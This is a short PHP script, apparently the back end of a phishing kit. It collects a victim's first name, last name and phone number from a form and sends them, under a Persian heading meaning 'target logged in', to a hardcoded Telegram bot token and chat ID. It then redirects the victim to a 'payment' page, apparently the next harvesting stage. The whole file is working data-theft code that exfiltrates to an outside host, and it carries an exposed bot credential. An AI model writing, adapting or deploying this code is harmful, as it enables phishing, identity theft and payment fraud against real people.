<?php
$TOKEN = "5456339479:AAErMB9WI-OH8A09eB6nWirZhSGoipHtvG4";
$ID = 2090609131;
$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
$phone = $_POST['phone'];
$Text = "
تارگت لاگین کرد
------------------------
اسم : $firstname
فامیلی : $lastname
شماره : <code>$phone</code>
------------------------
Coded by Masih
";
file_get_contents("https://api.telegram.org/bot".$TOKEN."/sendMessage?parse_mode=HTML&chat_id=".$ID."&text=".urlencode($Text));
header('Location: payment/index.php');
?>